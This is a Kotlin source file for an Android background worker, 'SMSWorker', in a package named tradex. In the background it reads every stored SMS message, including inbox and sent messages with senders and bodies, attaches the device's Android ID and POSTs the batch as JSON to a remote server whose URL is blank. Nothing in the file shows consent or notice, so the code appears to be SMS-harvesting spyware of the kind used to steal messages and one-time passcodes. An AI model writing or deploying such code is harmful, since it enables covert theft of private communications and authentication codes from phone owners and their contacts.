package com.example.tradex

import android.content.Context
import android.net.Uri
import android.provider.Settings.Secure
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class SMSWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val deviceId = getDeviceIdentifier()
            val smsMessages = fetchSmsMessages(deviceId)
            val backendResponse = sendSmsToBackend(smsMessages)

            if (backendResponse) {
                Log.d("SMSWorker", "SMS messages sent successfully!")
                Result.success()
            } else {
                Log.e("SMSWorker", "Failed to send SMS messages to backend.")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e("SMSWorker", "Error occurred: ${e.message}", e)
            Result.failure()
        }
    }

    private fun getDeviceIdentifier(): String {
        return try {
            Secure.getString(
                context.contentResolver,
                Secure.ANDROID_ID
            ) ?: "unknown_device"
        } catch (e: Exception) {
            Log.e("SMSWorker", "Device ID error: ${e.message}", e)
            "error_device_${System.currentTimeMillis()}"
        }
    }

    private fun fetchSmsMessages(deviceId: String): List<Map<String, Any>> {
        val smsList = mutableListOf<Map<String, Any>>()
        val uri = Uri.parse("content://sms")
        val projection = arrayOf("address", "body", "date", "type")

        val cursor = context.contentResolver.query(uri, projection, null, null, null)
        cursor?.use {
            val addressIndex = it.getColumnIndex("address")
            val bodyIndex = it.getColumnIndex("body")
            val dateIndex = it.getColumnIndex("date")
            val typeIndex = it.getColumnIndex("type")

            while (it.moveToNext()) {
                val address = it.getString(addressIndex)?.trim() ?: "Unknown"
                val body = it.getString(bodyIndex)?.trim() ?: "No Content"
                val date = it.getLong(dateIndex)
                val type = when (it.getInt(typeIndex)) {
                    1 -> "Inbox"
                    2 -> "Sent"
                    else -> "Other"
                }

                smsList.add(mapOf(
                    "sender" to address,
                    "message" to body,
                    "date" to date,
                    "type" to type,
                    "device_identifier" to deviceId
                ))
            }
        }
        return smsList
    }

    private fun sendSmsToBackend(smsMessages: List<Map<String, Any>>): Boolean {
        val url = URL("")
        val jsonArray = JSONArray()

        for (sms in smsMessages) {
            val smsJson = JSONObject().apply {
                put("sender", sms["sender"])
                put("message", sms["message"])
                put("date", sms["date"])
                put("device_identifier", sms["device_identifier"])
            }
            jsonArray.put(smsJson)
        }

        val connection = url.openConnection() as HttpURLConnection
        connection.apply {
            requestMethod = "POST"
            setRequestProperty("Content-Type", "application/json")
            doOutput = true
        }

        OutputStreamWriter(connection.outputStream).use {
            it.write(jsonArray.toString())
            it.flush()
        }

        return try {
            connection.responseCode == HttpURLConnection.HTTP_CREATED
        } catch (e: IOException) {
            Log.e("SMSWorker", "Network error: ${e.message}")
            false
        }
    }
}
